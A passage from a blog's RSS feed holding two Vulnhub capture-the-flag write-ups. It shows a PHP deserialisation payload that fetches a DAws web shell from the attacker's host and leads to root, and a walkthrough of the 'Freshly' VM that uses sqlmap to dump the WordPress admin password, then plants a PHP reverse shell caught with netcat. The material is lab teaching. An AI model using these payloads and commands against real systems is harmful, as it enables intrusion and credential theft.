        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fwrite($f,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$data);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fclose($f);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;chmod($this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;path&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;name_file&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0644&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;Show&lt;/code&gt; class on the other hand is only useful for testing, as this will provide visual
feedback when &lt;code&gt;sec.php&lt;/code&gt; gets rendered and runs the &lt;code&gt;echo&lt;/code&gt; statement. This will
invoke the &lt;code&gt;__toString&lt;/code&gt; method on the &lt;code&gt;Show&lt;/code&gt; class. Passing &lt;code&gt;test=O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:2:&amp;quot;XX&amp;quot;;}&lt;/code&gt;
will print &lt;code&gt;Showme&lt;/code&gt;, confirming that the serialisation worked.&lt;/p&gt;

&lt;p&gt;Now to get DAws on there as root. First things first I need to determine the serialised
string. I do this with a simple PHP script that searialises the &lt;code&gt;Test&lt;/code&gt; class and
prints out the string I need. Which is&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:30:&amp;quot;http://192.168.56.101/DAws.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;DAws.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Using Burp suite I use a &lt;code&gt;GET&lt;/code&gt; request to &lt;code&gt;sec.php&lt;/code&gt;, send it to &lt;code&gt;Repeater&lt;/code&gt; and convert
it to a &lt;code&gt;POST&lt;/code&gt; request with the required payload:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/kiutbRt.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Then I, once again, browse to my DAws url and bind a shell to finally get:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# whoami &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; id
root
uid=0(root) gid=0(root) groups=0(root)
# cat flag.txt
      ___           ___           ___           ___           ___           ___           ___     
     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 



     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
     tratando de llegar hasta aca. Eso es lo que realmente importa!.


#Blog: www.securitysignal.org

#Twitter: @SecSignal, @q3rv0
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I learned sooooo much through this VM. Many thanks to qu3rv0 for creating it,
Vulnhub for hosting it, and the people who helped me get through it (esp g0blin).&lt;/p&gt;

&lt;p&gt;I look forward to the next one.&lt;/p&gt;

&lt;h1 id=&#34;note:3817275722f75303351ad52bb23d8c3d&#34;&gt;Note&lt;/h1&gt;

&lt;p&gt;As it was possible to upload a shell with the SQL Admin page, browsing to &lt;code&gt;/var/www&lt;/code&gt; would have
taken us directly to the end stage. All the info was there and &lt;code&gt;suphp.conf&lt;/code&gt; is world writeable.
Had I done that though I would have missed out on the XPath challenge, which taught me some new tricks,
as well as all the other fun puzzles.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub&#39;s &#39;TopHatSec Freshly&#39;</title>
      <link>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</guid>
      <description>&lt;p&gt;This is my first writeup of a &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;

&lt;p&gt;The challenge is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;

&lt;p&gt;First I need to determine the image&amp;rsquo;s IP address and what services it is running:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qgkgkgg.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;

&lt;p&gt;In that case let&amp;rsquo;s see if the SSL port holds anything more interesting.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/wvHo8ru.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice, looks like I&amp;rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&amp;rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SHEXup3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Before I start work on that, let me just see what&amp;rsquo;s at port &lt;em&gt;8080&lt;/em&gt;. Ah, it&amp;rsquo;s a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I&amp;rsquo;m going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &amp;#39;http://192.168.56.103:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s a few there, so I&amp;rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;

&lt;p&gt;This requires the user to be logged in, and seeing as I don&amp;rsquo;t have a login
I won&amp;rsquo;t get very far with this.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;

&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;

&lt;p&gt;Not much luck with this. Although it doesn&amp;rsquo;t require a login, I wasn&amp;rsquo;t
successful with getting anything out of it.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;

&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, thinking cap back on&amp;hellip;. I need a different angle of attack.&lt;/p&gt;

&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/2ddRfdF.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let&amp;rsquo;s see. I&amp;rsquo;ll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is how I set it up&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/auVPaoO.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/l647X5u.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c8aSx4n.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&amp;rsquo;s stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let&amp;rsquo;s see what we can find:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;user&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;password&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve removed some of the output for clarity, but I can see
that there&amp;rsquo;s possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it&amp;rsquo;s a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;

&lt;p&gt;First I&amp;rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &amp;ldquo;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &amp;lsquo;&amp;ndash;time-sec&amp;rsquo;)? [Y/n]&lt;/em&gt;&amp;rdquo; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dbs

&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.56.103&amp;#39;

[*] shutting down at 12:25:44
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let&amp;rsquo;s take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --tables -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn&amp;rsquo;t find anything useful in them, so I won&amp;rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&amp;hellip; &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I&amp;rsquo;m going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site&amp;rsquo;s &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;

&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;SECRET&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I&amp;rsquo;d still
be looking for the file now :)&lt;/p&gt;

&lt;p&gt;So that&amp;rsquo;s one way to do it.&lt;/p&gt;

&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&amp;rsquo;s late now, so I&amp;rsquo;ll save that for
another time.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>